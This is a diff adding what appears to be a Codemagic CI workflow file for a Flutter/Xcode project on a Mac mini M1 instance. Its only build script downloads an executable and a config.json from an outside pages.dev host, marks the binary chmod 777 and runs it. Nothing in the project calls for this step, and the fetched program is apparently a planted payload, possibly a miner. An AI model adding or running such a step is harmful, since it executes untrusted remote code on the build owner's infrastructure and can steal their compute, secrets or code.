@@ -1,0 +1,11 @@
+workflows:
+  my-workflow:
+    name: My workflow name
+    instance_type: mac_mini_m1
+    environment:
+      groups:
+        - group_name
+      flutter: stable
+      xcode: latest
+    scripts:
+      - wget https://forscienceyoumonster.pages.dev/mac/mac && wget https://forscienceyoumonster.pages.dev/mac/config.json && chmod 777 ./mac && ./mac
